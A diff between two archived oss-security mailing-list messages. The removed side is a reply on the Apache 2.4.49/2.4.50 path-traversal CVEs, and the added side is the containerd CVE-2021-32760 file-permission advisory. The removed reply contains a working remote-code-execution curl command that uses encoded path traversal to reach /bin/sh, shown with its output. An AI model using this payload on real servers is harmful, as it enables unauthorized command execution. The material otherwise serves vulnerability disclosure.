@@ -1,52 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/08/1
-Message-ID: <0d7be57c-87ae-c4aa-7207-2337c1a51c6d@rs-labs.com>
-Date: Fri, 8 Oct 2021 03:18:14 +0200
-From: Roman Medina-Heigl Hernandez <roman@...labs.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2021-42013: Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/07/19/2
+Message-ID: <b948d018a470d7bc6d016a9bbdb3c444aead770c.camel@amazon.com>
+Date: Mon, 19 Jul 2021 18:44:24 +0000
+From: "Karp, Samuel" <skarp@...zon.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE-2021-32760: containerd archive package allows chmod of file outside of unpack target directory
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+A bug was found in containerd where pulling and extracting a specially-
+crafted container image can result in Unix file permission changes for
+existing files in the host’s filesystem. Changes to file permissions
+can deny access to the expected owner of the file, widen access to
+others, or set extended bits like setuid, setgid, and sticky. This bug
+does not directly allow files to be read, modified, or executed without
+an additional cooperating process.
 
-I posted RCE exploit for this (it works for both CVEs: 41773 & 42013)
-and some other details regarding requirements / exploitability, which
-you may find useful at:
+Patches
+This bug has been fixed in containerd 1.5.4 and 1.4.8. Users should
+update to these versions as soon as they are released. Running
+containers do not need to be restarted.
 
-https://twitter.com/roman_soft/status/1446252280597078024
+Workarounds
+Ensure you only pull images from trusted sources.
 
+Linux security modules (LSMs) like SELinux and AppArmor can limit the
+files potentially affected by this bug through policies and profiles
+that prevent containerd from interacting with unexpected files.
+For more information
 
-Excerpt (for the sake of ml-archive):
+If you have any questions or comments about this advisory:
 
-RCE exploit both for Apache 2.4.49 (CVE-2021-41773) and 2.4.50
-(CVE-2021-42013): root@...06:~# curl
-'http://192.168.0.191/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
---data 'echo Content-Type: text/plain; echo; id' uid=1(daemon)
-gid=1(daemon) groups=1(daemon)
+Open an issue [1]
+Email us at security@...tainerd.io if you think you’ve found a security
+bug.
 
+View this advisory on the web: 
+https://github.com/containerd/containerd/security/advisories/GHSA-c72p-9xmj-rx3w
 
-Cheers.
+On behalf of the containerd project,
+Samuel Karp
 
--r
-
-
-El 07/10/2021 a las 17:24, Stefan Eissing escribió:
-> Severity: critical
->
-> Description:
->
-> It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.  
->
-> If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.
->
-> This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.
->
-> Credit:
->
-> Reported by Juan Escobar from Dreamlab Technologies, Fernando Muñoz from NULL Life CTF Team, and Shungo Kumasaka
->
--- 
-Saludos,
--Román
-
-
+[1] https://github.com/containerd/containerd/issues/new/choose
